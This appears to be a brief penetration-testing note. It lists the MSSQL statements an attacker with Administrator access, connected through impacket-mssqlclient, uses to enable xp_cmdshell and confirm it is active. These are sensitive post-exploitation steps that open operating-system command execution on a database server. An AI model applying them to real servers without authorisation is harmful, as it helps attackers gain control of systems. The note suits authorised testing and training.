
Works when we are authenticated as Administrator on the mssql database.

## PoC

Assuming we have connected to the database with impacket-mssqlclient, we can utilize the following steps in order to activate xp_cmdshell.

1. Step: Show advanced options (required)

```
EXEC sp_configure 'show advanced options', '1';
```

```
RECONFIGURE;
```

2. Step: Enable xp_cmdshell

```
EXEC sp_configure 'xp_cmdshell', '1';
```

```
RECONFIGURE;
```

3. Step: Verify it's enabled

```
EXEC sp_configure 'xp_cmdshell';
```

Should show: config_value = 1, run_value = 1